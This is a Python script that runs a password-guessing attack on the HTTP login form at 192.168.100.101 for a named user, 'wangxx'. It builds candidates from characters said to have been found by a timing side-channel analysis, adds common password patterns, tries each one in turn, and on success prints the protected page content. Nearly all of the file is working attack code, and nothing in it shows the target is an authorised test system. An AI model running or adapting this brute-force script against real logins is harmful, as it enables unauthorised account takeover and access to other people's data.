#!/usr/bin/env python3
"""
Focused Attack Based on Timing Side-Channel Results
Generates candidates based on timing analysis results
"""

import requests
import time
import itertools

def test_html_password(password):
    """Test a password against HTML form"""
    try:
        response = requests.post(
            'http://192.168.100.101/dologin.html',
            data={'httpd_username': 'wangxx', 'httpd_password': password},
            timeout=10,
            allow_redirects=False
        )
        
        # Check for success
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            if 'success' in location.lower() or 'welcome' in location.lower() or location == '/':
                return True, f"SUCCESS: Redirect to {location}"
        
        if response.status_code == 200:
            content = response.text.lower()
            if 'welcome' in content or 'success' in content or 'authenticated' in content:
                return True, f"SUCCESS: Content indicates authentication"
        
        return False, f"Status: {response.status_code}"
        
    except Exception as e:
        return False, f"ERROR: {str(e)}"

def generate_timing_based_candidates():
    """Generate candidates based on timing analysis"""
    
    # Fastest responding characters from timing attack
    fast_chars = ['B', 'P', '3', 'v', 'e', 'z', 'Y', 'O', 'W', '5', 'S', '1', '9']
    
    # Known fast patterns
    base_patterns = ['passw0rd', 'a1b2c3d4', 'trustno1', '1q2w3e4r']
    
    candidates = []
    
    # 1. Test exact fast patterns first
    candidates.extend(base_patterns)
    
    # 2. Test patterns starting with fastest characters
    for char in fast_chars[:5]:  # Top 5 fastest
        candidates.extend([
            char + 'assword',  # P + assword = Password
            char + 'a55w0rd',  # 3 + a55w0rd = 3a55w0rd  
            char + '1234567',  # B + 1234567 = B1234567
            char + 'ssw0rd1',  # e + ssw0rd1 = essw0rd1
            char.lower() + '1234567',  # Convert to lowercase
            char + 'qwerty1',
            char + 'assw0rd'
        ])
    
    # 3. Variations of fast base patterns
    for pattern in base_patterns:
        # Replace first char with fast chars
        for char in fast_chars[:3]:
            candidates.append(char + pattern[1:])
            candidates.append(char.lower() + pattern[1:])
        
        # Add numbers to make 8 chars if needed
        if len(pattern) < 8:
            candidates.append(pattern + '1')
            candidates.append(pattern + '12')
            candidates.append(pattern + '123')
    
    # 4. Common patterns with fast chars
    for char in fast_chars[:5]:
        candidates.extend([
            char + char + '123456',  # BB123456, PP123456
            char * 2 + '1234',       # BB1234, PP1234  
            char + '1' + char + '234', # B1B234, P1P234
            '123' + char + '4567',   # 123B4567
            char + 'abcdefg',        # Babcdefg
            'qwerty' + char + '1'    # qwertyB1
        ])
    
    # 5. Keyboard patterns related to fastest chars
    keyboard_patterns = []
    if 'P' in fast_chars:
        keyboard_patterns.extend(['PLokm012', 'p0lokm12', 'Plokm123'])
    if 'B' in fast_chars:
        keyboard_patterns.extend(['Bvghn123', 'bgvhn123', 'B1vghn12'])
    if '3' in fast_chars:
        keyboard_patterns.extend(['3edcvfr1', '3edc4rfv', '3edcxsw2'])
    
    candidates.extend(keyboard_patterns)
    
    # 6. Remove duplicates and filter to 8 characters
    candidates = list(set(candidates))
    candidates = [c for c in candidates if len(c) == 8 and c.replace('_', '').replace('-', '').isalnum()]
    
    return candidates

def main():
    print("Focused Attack Based on Timing Analysis")
    print("=" * 50)
    
    candidates = generate_timing_based_candidates()
    print(f"Generated {len(candidates)} timing-based candidates")
    print()
    
    success_found = False
    
    for i, password in enumerate(candidates, 1):
        print(f"[{i:3d}/{len(candidates)}] Testing: {password}")
        
        success, result = test_html_password(password)
        print(f"    Result: {result}")
        
        if success:
            print()
            print("=" * 50)
            print(f"*** SUCCESS! PASSWORD FOUND: {password} ***")
            print("=" * 50)
            
            # Test access to protected content
            try:
                response = requests.post(
                    'http://192.168.100.101/dologin.html',
                    data={'httpd_username': 'wangxx', 'httpd_password': password},
                    timeout=10,
                    allow_redirects=True
                )
                
                print(f"Protected content access:")
                print(f"Final URL: {response.url}")
                print(f"Status: {response.status_code}")
                print(f"Content preview: {response.text[:200]}")
                
            except Exception as e:
                print(f"Error accessing protected content: {e}")
            
            success_found = True
            break
        
        time.sleep(0.3)  # Rate limiting
    
    if not success_found:
        print()
        print("=" * 50)
        print("No successful authentication found with timing-based candidates")
        print("=" * 50)
    
    return success_found

if __name__ == "__main__":
    main()